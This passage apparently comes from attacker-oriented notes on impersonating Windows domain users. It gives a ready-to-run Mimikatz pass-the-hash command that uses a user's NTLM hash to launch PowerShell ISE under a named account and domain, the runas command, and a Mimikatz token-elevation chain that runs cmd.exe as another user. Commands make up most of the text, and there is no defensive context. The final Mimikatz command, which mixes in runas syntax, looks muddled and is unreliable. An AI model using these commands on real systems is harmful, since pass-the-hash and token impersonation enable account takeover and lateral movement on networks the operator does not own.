The `sekurlsa::pth` command is useful when you have the hash, while `runas` or token impersonation can be used when you have the password or an elevated token. 

If you have the NTLM hash of a user, you can switch to that user context using Mimikatz:

- **Command:**
  ```plaintext
  mimikatz.exe "sekurlsa::pth /user:mmu7 /domain:glb.com /ntlm:<hash> /run:powershell_ise.exe"
  ```

  - `/user:mmu7`: The userne you want to impersonate.
  - `/domain:glb.com`: The domain of the user.
  - `/ntlm:<hash>`: The NTLM hash of the user's password.
  - `/run:powershell_ise.exe`: The application to run under the impersonated user context.

### Switching Users with Mimikatz Using a Password or Token

If you have the user's password or a token, you can either use `runas` or token impersonation:

#### Using `runas`:

- **Command:**
  ```bash
  runas /user:<domain>\<user> "powershell_ise.exe"
  ```

  - You will be prompted to enter the password for the user.

#### Using Token Impersonation with Mimikatz:

- **Command:**
  ```plaintext
  mimikatz.exe "privilege::debug" "token::elevate" "runas /user:<domain>\<user> cmd.exe"
  ```

  - This elevates the token and runs the command (`cmd.exe` in this case) as the impersonated user.

